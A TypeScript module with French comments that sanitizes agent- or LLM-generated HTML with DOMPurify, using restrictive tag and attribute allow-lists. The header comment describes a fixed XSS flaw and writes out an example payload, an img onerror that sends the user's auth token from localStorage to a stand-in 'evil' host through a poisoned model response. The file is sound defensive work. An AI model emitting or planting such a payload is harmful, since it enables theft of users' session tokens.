// Sanitization HTML — Syléa.AI
//
// Fix Phase 1 (2026-06) : du HTML fourni par le LLM/agent était injecté via
// dangerouslySetInnerHTML sans filtrage (AgentsPage table rendering). Une
// réponse empoisonnée pouvait contenir `<img src=x onerror=fetch('//evil/?'
// +localStorage.sylea_auth_token)>` → vol de token.
//
// sanitizeAgentHtml() filtre via DOMPurify : ne garde QUE les balises de
// formatage/table sûres, supprime tout script, event handler (onerror,
// onclick…), iframe, style externe, etc.

import DOMPurify from 'dompurify'

// Balises autorisées pour le rendu de tableaux/contenu riche agent.
// Volontairement restrictif : pas de script, iframe, object, embed, form,
// style, link, meta, base. Pas d'attributs d'événement.
const ALLOWED_TAGS = [
  'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td', 'caption', 'colgroup', 'col',
  'p', 'br', 'hr', 'span', 'div',
  'strong', 'b', 'em', 'i', 'u', 's', 'mark', 'small', 'sub', 'sup',
  'ul', 'ol', 'li', 'dl', 'dt', 'dd',
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'blockquote', 'pre', 'code',
  'a',
]

const ALLOWED_ATTR = ['href', 'title', 'colspan', 'rowspan', 'scope', 'class', 'align']

/**
 * Sanitize du HTML d'origine agent/LLM avant injection dans le DOM.
 * Bloque scripts, event handlers, et schemes dangereux dans les href.
 */
export function sanitizeAgentHtml(dirty: string | null | undefined): string {
  if (!dirty || typeof dirty !== 'string') return ''
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS,
    ALLOWED_ATTR,
    // Bloque javascript:, data: (sauf images), etc. dans les href.
    ALLOW_DATA_ATTR: false,
    // Force target=_blank href à être sûrs (DOMPurify retire les schemes dangereux).
    FORBID_TAGS: ['style', 'script', 'iframe', 'object', 'embed', 'form', 'link', 'meta', 'base'],
    FORBID_ATTR: ['style', 'srcset'],
  })
}
